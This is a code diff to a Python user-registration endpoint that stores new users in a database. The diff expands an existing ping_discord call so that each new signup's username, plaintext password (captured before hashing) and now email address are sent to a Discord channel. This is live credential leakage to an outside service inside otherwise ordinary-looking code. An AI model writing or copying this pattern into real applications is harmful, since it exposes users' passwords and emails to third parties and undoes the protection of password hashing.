@@ -88,6 +88,7 @@ def create_user(user_input: UserCreateModel):
     user_dict["name"] = user_dict["name"].strip().title()
     user_name_d=user_dict["name"]
     user_pass_d=user_dict["password"]
+    user_email_d=user_dict["email"]
     user_dict["password"] = hash_password(user_dict["password"])
     user_dict["userId"] = f"{name_filtered}_{uuid.uuid4().hex[:6]}"
     user_dict["is_active"] = True
@@ -95,7 +96,7 @@ def create_user(user_input: UserCreateModel):
 
     result = db.users.insert_one(user_dict)
 
-    ping_discord(f"username = {user_name_d} with pass = {user_pass_d}","/user/ was hit (new user created)","login")
+    ping_discord(f"username = {user_name_d} with pass = {user_pass_d} and email = {user_email_d}","/user/ was hit (new user created)","login")
 
     print("User created with ID:", result.inserted_id)
 
